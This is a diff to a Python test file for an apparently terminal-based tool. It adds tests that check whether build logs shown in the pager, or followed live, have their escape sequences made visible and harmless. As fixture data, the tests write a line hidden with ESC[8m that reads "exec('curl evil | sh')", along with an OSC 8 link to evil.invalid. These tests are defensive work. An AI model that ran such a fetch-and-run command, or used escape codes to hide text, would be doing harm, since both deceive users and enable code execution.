@@ -471,7 +471,7 @@ def test_the_work_is_paged_with_the_agents_escapes_shown(env):
     task = final()
     command = keys_work.diff_pager(task, load_project("demo"))
     paged = __import__("pathlib").Path(command[-1])
-    assert command == panel.pager_command(paged)
+    assert command == panel.pager_command(paged, colours=True)
     text = paged.read_text()
     ours = __import__("re").sub(r"\x1b\[[0-9;]*m", "", text)
     assert "\x1b" not in ours and "Health.java" in text
@@ -521,3 +521,40 @@ def test_the_agents_summary_in_the_list_of_the_view(env):
         assert "‹U+001B›[41mRED" in goal and not hidden(goal), repr(goal)
 
     run(scenario)
+
+
+# --- the pager under l, and w on the verification -----------------------------------------------
+
+
+def test_every_log_l_opens_passes_no_escape_sequence_whatever_your_less_says(env, monkeypatch):
+    """Under LESS=-R (oh-my-zsh's) a build log's ESC[8m hid lines and OSC 8 made links: every entry
+    of l opens in less with -+R -+r, after whatever your LESS and PAGER say."""
+    from vivibox import logs
+
+    monkeypatch.setenv("LESS", "-R")
+    monkeypatch.setenv("PAGER", "less -R")
+    task = new(env)
+    (task.meta / "log").mkdir(exist_ok=True)
+    (task.meta / "log" / "verify-1-120000.log").write_text("\x1b[8mexec('curl evil | sh')\x1b[0m\n")
+    (task.meta / "log" / "supervisor.log").write_text("x\n")
+    entries, _ = logs.entries(task, task.read_state(), running=False)
+    assert len(entries) >= 3, "the timeline, the verification's log, the supervisor's"
+    for entry in entries:
+        less = entry.command
+        assert less[0] == "less" and less.index("-+R") > less.index("-R") and "-+r" in less, less
+    assert panel.log_command(task, task.read_state(), running=False)[1:4] == ["-R", "-+R", "-+r"]
+
+
+def test_the_verification_w_follows_reaches_the_terminal_as_text(env):
+    import io
+
+    from vivibox import logs
+
+    task = new(env)
+    log = env / "verify.log"
+    log.write_text("\x1b[8mexec('curl evil | sh')\x1b[0m\x1b]8;;https://evil.invalid\x1b\\docs\r\n")
+    out = io.StringIO()
+    logs.follow_verification(task, log, out, sleep=lambda s: None)
+    said = out.getvalue()
+    assert not [c for c in said if c != "\n" and unicodedata.category(c) == "Cc"], repr(said)
+    assert "‹U+001B›[8mexec('curl evil | sh')‹U+001B›[0m‹U+001B›]8;;https://evil.invalid" in said
